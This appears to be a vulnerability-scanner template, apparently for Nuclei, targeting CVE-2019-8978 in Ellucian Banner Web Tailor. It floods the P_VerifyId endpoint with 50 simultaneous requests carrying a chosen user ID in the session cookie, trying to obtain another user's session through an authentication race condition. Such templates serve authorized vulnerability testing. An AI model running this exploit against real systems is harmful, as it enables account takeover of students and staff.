id: CVE-2019-8978

info:
  name: Ellucian Banner Web Tailor - Race Condition
  author: Ritik Prajapati
  severity: high
  description: |
    Ellucian Banner Web Tailor 8.8.3, 8.8.4, 8.9 contains an improper authentication vulnerability caused by a race condition in conjunction with SSO Manager. This template attempts to reproduce the race condition by flooding the P_VerifyId endpoint.
  reference:
    - https://github.com/SecKatie/CVE-2019-8978
    - https://nvd.nist.gov/vuln/detail/CVE-2019-8978
  tags: cve,cve2019,ellucian,race-condition

variables:
  # Users will provide their own target ID at runtime
  target_id: "123456"

requests:
  - raw:
      - |
        GET /wtlg/lwgkpcal.P_VerifyId HTTP/1.1
        Host: {{Hostname}}
        Cookie: IDMSESSID={{target_id}}

    # ATTACK CONFIGURATION
    # Matches the logic of the original Python exploit (requests_per_batch = 50)
    race: true
    race_count: 50

    matchers:
      - type: word
        part: header
        words:
          - "SESSID="
      - type: status
        status:
          - 200
